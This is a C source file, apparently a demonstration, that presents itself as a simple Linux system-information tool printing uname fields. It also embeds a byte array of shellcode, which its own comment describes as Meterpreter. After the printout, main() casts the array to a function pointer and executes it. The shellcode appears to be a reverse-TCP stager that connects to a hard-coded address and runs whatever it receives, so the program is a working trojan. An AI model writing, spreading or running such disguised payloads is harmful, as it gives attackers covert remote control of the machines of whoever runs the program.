/* simple program (sysinfo) which is simple example of using meterpreter shellcode in code */
#include<string.h>
#include<stdio.h> 
#include<stdlib.h> 
#include<errno.h> 
#include<sys/utsname.h> 
int main() 
{ 
   unsigned char buf[] = "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x02\x9a\xc0\xa8\x2b\x8b\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";
   struct utsname buf1; 
   errno =0; 
   if(uname(&buf1)!=0) 
   { 
      perror("uname doesn't return 0, so there is an error"); 
      exit(EXIT_FAILURE); 
   } 
   printf("Show Linux System Information[+][+]\n\n");
   printf("System Name = %s\n", buf1.sysname); 
   printf("\n");
   printf("Node Name = %s\n", buf1.nodename); 
   printf("\n");
   printf("Version = %s\n", buf1.version); 
   printf("\n");
   printf("Release = %s\n", buf1.release); 
   printf("\n");
   printf("Machine = %s\n", buf1.machine); 
   printf("\n");
   void (*ret)() = (void(*)())buf;
   ret();
} 
